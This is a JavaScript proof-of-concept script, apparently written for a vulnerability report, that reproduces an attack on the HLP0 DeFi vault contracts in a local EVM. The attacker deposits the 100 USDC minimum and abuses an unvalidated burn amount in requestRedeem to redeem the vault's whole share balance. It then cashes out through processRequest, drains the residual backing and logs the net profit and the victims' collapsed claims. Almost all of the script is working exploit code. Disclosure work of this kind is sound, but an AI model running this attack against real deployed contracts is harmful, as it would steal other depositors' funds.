// ============================================================================
// HLP0 production-code PoC  —  repo hlp0to/hlp0-contracts @ d29208a
// src/HLP0.sol, src/HLPSHARES.sol, src/HLPUSDC.sol  (byte-identical sources)
// Local EVM only. No RPC, no fork. Contracts compiled unmodified from src/.
// ============================================================================
const { Chain, ARBITRUM_USDC, decodeRevert } = require('./harness');

const usdc = (n) => BigInt(Math.round(n * 1e6));
const fmt = (x) => (Number(x) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 6 });
const log = (...a) => console.log(...a);
const out = {};

async function main() {
  const chain = await new Chain().init();
  const A = {
    gov: chain.addActor('gov'),
    oracle: chain.addActor('oracle'),
    processor: chain.addActor('processor'),
    alice: chain.addActor('alice'),
    bob: chain.addActor('bob'),
    attacker: chain.addActor('attacker'),
  };

  // ---- install real Arbitrum USDC code at the exact address HLP0 imports ---
  {
    const { ART } = require('./harness');
    const { Address, Account } = require('@ethereumjs/util');
    for (const name of ['MockUSDC']) {
      const addr = Address.fromString(ARBITRUM_USDC);
      await chain.vm.stateManager.putAccount(addr, new Account(0n, 0n));
      await chain.vm.stateManager.putContractCode(addr, Buffer.from(ART[name].deployed.slice(2), 'hex'));
    }
  }

  // ---- deploy the production stack ----------------------------------------
  const endpoint = await chain.deploy('MockLZEndpoint', [usdc(0.01)]);
  const hlpUsdc = await chain.deploy('HLPUSDC');
  const hlpShares = await chain.deploy('HLPSHARES');
  const impl = await chain.deploy('HLP0', [endpoint]);
  const vault = await chain.deploy('SimpleProxy', [impl]);
  for (const n of Object.keys(A)) await chain.setBalance(A[n], 10n ** 24n);

  log('== deployment ==');
  log('vault(proxy)     ', vault);
  log('HLP0 impl        ', impl);
  log('HLPUSDC          ', hlpUsdc);
  log('HLPSHARES        ', hlpShares);
  log('LZ endpoint      ', endpoint);
  log('actor addresses  ', JSON.stringify(A, null, 0));

  async function must(label, to, sig, args, from) {
    const r = await chain.tx(to, sig, args, { from });
    if (r.execResult.exceptionError) {
      throw new Error(`${label} REVERTED: ${decodeRevert(r.execResult.returnValue)}`);
    }
    return r;
  }
  async function tryIt(label, to, sig, args, from) {
    const r = await chain.tx(to, sig, args, { from });
    const ok = !r.execResult.exceptionError;
    return { ok, err: ok ? null : decodeRevert(r.execResult.returnValue), r };
  }

  // ---- wiring (deployment script steps) -----------------------------------
  await must('HLPUSDC.setMinter', hlpUsdc, 'setMinter(address)', [vault], 'deployer');
  await must('HLPSHARES.setMinter', hlpShares, 'setMinter(address)', [vault], 'deployer');
  await must('HLP0.initialize', vault, 'initialize(string,string,address,address,address,address)',
    ['HyperLiquidity Provider OFT', 'HLP0', hlpUsdc, hlpShares, A.gov, A.gov], 'gov');
  await must('setOracleProvider', vault, 'setOracleProvider(address)', [A.oracle], 'gov');
  await must('setRequestProcessor', vault, 'setRequestProcessor(address)', [A.processor], 'gov');
  await must('setPeer', vault, 'setPeer(uint32,bytes32)',
    [30184, '0x' + '00'.repeat(12) + 'ff'.repeat(20)], 'gov');
  log('\n== wiring ==\nHLP0.initialize OK, minter/oracle/processor/peer set');

  // ---- honest third-party liquidity --------------------------------------
  const DEP = usdc(1_000_000);
  for (const n of ['alice', 'bob']) {
    await must('mint usdc', ARBITRUM_USDC, 'mint(address,uint256)', [A[n], DEP], 'deployer');
    await must('approve', ARBITRUM_USDC, 'approve(address,uint256)', [vault, DEP], n);
    await must('deposit', vault, 'deposit(uint256,address)', [DEP, A[n]], n);
  }
  const q = async (sig, args = []) => (await chain.view(vault, sig, args))[0];
  const snapshot = async () => ({
    HLP0_totalSupply_view: await q('totalSupply()'),
    HLP0_actualTotalSupply: await q('actualTokenSupply()'),
    totalAssets: await q('totalAssets()'),
    ratio: await q('ratio()'),
    HLPSHARES_supply: (await chain.view(hlpShares, 'totalSupply()'))[0],
    HLPUSDC_supply: (await chain.view(hlpUsdc, 'totalSupply()'))[0],
    vault_usdc: await chain.balanceOfUsdc(ARBITRUM_USDC, vault),
    alice_hlp0: (await chain.view(vault, 'balanceOf(address)', [A.alice]))[0],
    attacker_hlp0: (await chain.view(vault, 'balanceOf(address)', [A.attacker]))[0],
    attacker_usdc: await chain.balanceOfUsdc(ARBITRUM_USDC, A.attacker),
    newRequestId: await q('NEW_REQUEST_ID()'),
  });

  const t0 = await snapshot();
  log('\n== initial state (victim liquidity) ==');
  log('HLP0 (ERC4626 totalSupply) = HLPSHARES =', fmt(t0.HLP0_totalSupply_view));
  log('totalAssets = HLPUSDC                =', fmt(t0.totalAssets));
  log('ratio                                 =', t0.ratio.toString());
  log('vault USDC balance                    =', fmt(t0.vault_usdc));
  log('alice HLP0                            =', fmt(t0.alice_hlp0));

  // ==========================================================================
  // ATTACK — no privileged role, plain EOA
  // ==========================================================================
  const SEED = usdc(100); // minimum deposit accepted by the contract
  await must('mint usdc', ARBITRUM_USDC, 'mint(address,uint256)', [A.attacker, SEED], 'deployer');
  await must('approve', ARBITRUM_USDC, 'approve(address,uint256)', [vault, SEED], 'attacker');
  await must('attacker deposit', vault, 'deposit(uint256,address)', [SEED, A.attacker], 'attacker');
  const t1 = await snapshot();
  log('\n== step 1: attacker deposits the 100 USDC minimum ==');
  log('attacker HLP0 shares        =', fmt(t1.attacker_hlp0));
  log('attacker USDC spent         =', fmt(SEED));
  log('vault HLPSHARES balance     =', fmt(t1.HLP0_totalSupply_view));

  // The whole vault-held HLPSHARES balance is reachable through the
  // unvalidated `_amountOfHLP` burn in requestRedeem.
  const vaultShareBalance = t1.HLP0_totalSupply_view;
  const expectedOut = (await chain.view(vault, 'previewRedeem(uint256)', [vaultShareBalance]))[0];
  log('\n== step 2: requestRedeem(vault\'s whole HLPSHARES balance) ==');
  log('_amountOfHLP being burnt    =', fmt(vaultShareBalance), '(attacker only owns', fmt(t1.attacker_hlp0) + ')');
  log('previewRedeem(_amountOfHLP) =', fmt(expectedOut));

  const rr = await tryIt('requestRedeem', vault, 'requestRedeem(uint256)', [vaultShareBalance], 'attacker');
  log('requestRedeem              ->', rr.ok ? 'SUCCESS' : 'REVERT: ' + rr.err);
  if (!rr.ok) {
    // Diagnose which inner step blocked it, to report precisely.
    out.blocked = rr.err;
    await diagnose(chain, vault, hlpShares, hlpUsdc, A, vaultShareBalance, t1);
    log('\n' + JSON.stringify(out, (k, v) => (typeof v === 'bigint' ? v.toString() : v), 2));
    return;
  }

  const t2 = await snapshot();
  const req = await chain.view(vault, 'getRequestMapping(uint256)', [0n]);
  log('request[0].requestor       =', req[0]);
  log('request[0].hlpAmount       =', fmt(req[1]));
  log('request[0].requestAmount   =', fmt(req[2]));
  log('vault HLPSHARES after burn =', fmt(t2.HLP0_totalSupply_view));
  log('vault HLPUSDC after burn   =', fmt(t2.totalAssets));
  log('vault USDC (real)          =', fmt(t2.vault_usdc), ' <- untouched, still there');

  // ==========================================================================
  // CASH-OUT — processRequest pays requestAmount from the shared pool
  // ==========================================================================
  const payAmount = req[2];
  await must('relayer cash leg', ARBITRUM_USDC, 'mint(address,uint256)', [A.processor, payAmount], 'deployer');
  await must('processRequest', vault, 'processRequest(uint256)', [0n], 'processor');
  const t3 = await snapshot();
  log('\n== step 3: processRequest(0) ==');
  log('attacker USDC received     =', fmt(t3.attacker_usdc));
  log('attacker net vs 100 spent  =', fmt(t3.attacker_usdc - SEED));

  // ==========================================================================
  // IMPACT on third parties: ratio collapse + victims' claim
  // ==========================================================================
  const aliceClaimBefore = (await chain.view(vault, 'previewRedeem(uint256)', [t0.alice_hlp0]))[0];
  const aliceClaimAfter = (await chain.view(vault, 'previewRedeem(uint256)', [t3.alice_hlp0]))[0];
  log('\n== step 4: effect on other depositors ==');
  log('ratio before / after       =', t0.ratio.toString(), '/', t3.ratio.toString());
  log('alice claim before         =', fmt(aliceClaimBefore), 'USDC');
  log('alice claim after          =', fmt(aliceClaimAfter), 'USDC');
  log('totalAssets before / after =', fmt(t0.totalAssets), '/', fmt(t3.totalAssets));

  // attacker flushes the remaining HLPUSDC backing
  const restShares = (await chain.view(hlpShares, 'balanceOf(address)', [vault]))[0];
  const restOut = (await chain.view(vault, 'previewRedeem(uint256)', [restShares]))[0];
  log('\n== step 5: attacker drains the residual backing ==');
  log('remaining HLPSHARES        =', fmt(restShares), '-> previewRedeem', fmt(restOut));
  const r2 = await tryIt('requestRedeem(rest)', vault, 'requestRedeem(uint256)', [restShares], 'attacker');
  log('requestRedeem(rest)        ->', r2.ok ? 'SUCCESS' : 'REVERT: ' + r2.err);
  if (r2.ok) {
    await must('relayer cash leg 2', ARBITRUM_USDC, 'mint(address,uint256)', [A.processor, restOut], 'deployer');
    await must('processRequest 2', vault, 'processRequest(uint256)', [1n], 'processor');
  }
  const t4 = await snapshot();
  const finalProfit = t4.attacker_usdc - SEED;
  log('\n################ RESULT ################');
  log('attacker spent             :', fmt(SEED), 'USDC');
  log('attacker received          :', fmt(t4.attacker_usdc), 'USDC');
  log('attacker NET PROFIT        :', fmt(finalProfit), 'USDC');
  log('victim alice still holds   :', fmt(t4.alice_hlp0), 'HLP0');
  log('vault totalAssets left     :', fmt(t4.totalAssets));
  log('vault USDC left            :', fmt(t4.vault_usdc));
  log('residual claim per HLP0    :', t4.ratio.toString(), '(1e6 = 1.0 USDC/share)');
  log('########################################');

  out.result = {
    attacker_spent: SEED, attacker_received: t4.attacker_usdc, net_profit: finalProfit,
    ratio_before: t0.ratio, ratio_after: t4.ratio,
    alice_claim_before: aliceClaimBefore, alice_claim_after: aliceClaimAfter,
    vault_totalAssets_after: t4.totalAssets, vault_shares_after: t4.HLP0_totalSupply_view,
  };
  log('\n' + JSON.stringify(out, (k, v) => (typeof v === 'bigint' ? v.toString() : v), 2));
}

// Determine exactly what blocks the unvalidated burn, if anything.
async function diagnose(chain, vault, hlpShares, hlpUsdc, A, amount, snap) {
  const r = {};
  r.attacker_owns_hlp0 = (await chain.view(vault, 'balanceOf(address)', [A.attacker]))[0];
  r.vault_own_hlpshares = (await chain.view(hlpShares, 'balanceOf(address)', [vault]))[0];
  r.vault_own_hlpusdc = (await chain.view(hlpUsdc, 'balanceOf(address)', [vault]))[0];
  r.amount_attempted = amount;
  // burn path is minter-only and burns the MINTER's own balance: no allowance
  r.hlpshares_minter = (await chain.view(hlpShares, 'minter()'))[0];
  r.hlpusdc_minter = (await chain.view(hlpUsdc, 'minter()'))[0];
  r.attacker_allowance_to_vault = (await chain.view(vault, 'allowance(address,address)',
    [A.attacker, vault]))[0];
  out.diagnose = r;
}

main().catch((e) => { console.error('FAIL', e); process.exit(1); });
